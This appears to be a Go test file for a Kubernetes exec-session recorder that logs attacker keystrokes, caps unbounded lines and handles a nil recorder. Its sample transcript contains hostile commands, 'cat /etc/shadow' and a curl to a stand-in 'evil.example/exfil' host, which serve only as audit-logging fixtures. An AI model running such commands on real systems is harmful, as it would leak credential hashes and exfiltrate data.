package kubeletshim

import (
	"bytes"
	"io"
	"log"
	"strings"
	"testing"
)

// TestSessionLog_TeesTranscriptToLog covers exec session recording: the
// attacker's interactive keystrokes (echoed into a pty's output) must reach
// the shim log, and the real stream must still get the bytes unchanged.
func TestSessionLog_TeesTranscriptToLog(t *testing.T) {
	var logBuf bytes.Buffer
	orig := log.Writer()
	log.SetOutput(&logBuf)
	log.SetFlags(0)
	defer log.SetOutput(orig)

	rec := newSessionLog("billing", "checkout-api-abc", "app", true, []string{"sh"})

	var realStream bytes.Buffer
	w := rec.tee(&realStream)

	// What an attacker's shell echoes back, line by line.
	w.Write([]byte("$ cat /etc/shadow\r\n"))
	w.Write([]byte("root:$6$xyz:19000:0:99999:7:::\r\n"))
	w.Write([]byte("$ curl http://ev")) // partial line, held back
	w.Write([]byte("il.example/exfil\r\n"))
	rec.done(0)

	// The real stream is byte-for-byte untouched.
	if !strings.Contains(realStream.String(), "cat /etc/shadow") {
		t.Fatalf("the real stdout stream must be unchanged, got: %q", realStream.String())
	}

	logged := logBuf.String()
	for _, want := range []string{
		"session start billing/checkout-api-abc",
		"cat /etc/shadow",
		"root:$6$xyz",
		"curl http://evil.example/exfil", // reassembled across two writes
		"session end",
		"exit=0",
	} {
		if !strings.Contains(logged, want) {
			t.Fatalf("expected %q in the session log, got:\n%s", want, logged)
		}
	}
}

// TestSessionLog_NilIsInert confirms a disabled recorder (nil) is a no-op:
// tee returns the writer untouched and done doesn't panic.
func TestSessionLog_NilIsInert(t *testing.T) {
	var s *sessionLog
	var buf bytes.Buffer
	if got := s.tee(&buf); got != &buf {
		t.Fatal("a nil recorder must return the writer untouched")
	}
	s.done(0) // must not panic
}

// TestSessionLog_CapsUnboundedLine covers a DoS guard: output with no
// newline (cat /dev/zero) must not grow the pending buffer without bound.
func TestSessionLog_CapsUnboundedLine(t *testing.T) {
	var logBuf bytes.Buffer
	orig := log.Writer()
	log.SetOutput(&logBuf)
	log.SetFlags(0)
	defer log.SetOutput(orig)

	rec := newSessionLog("ns", "pod", "c", true, []string{"sh"})
	w := rec.tee(io.Discard)

	// 100 KB with no newline at all.
	if _, err := w.Write(bytes.Repeat([]byte("A"), 100*1024)); err != nil {
		t.Fatal(err)
	}

	rec.mu.Lock()
	pending := len(rec.pending)
	rec.mu.Unlock()
	if pending > maxPendingLine {
		t.Fatalf("pending buffer must be capped at %d, grew to %d", maxPendingLine, pending)
	}
	if logBuf.Len() == 0 {
		t.Fatal("the capped output should still have been logged")
	}
}
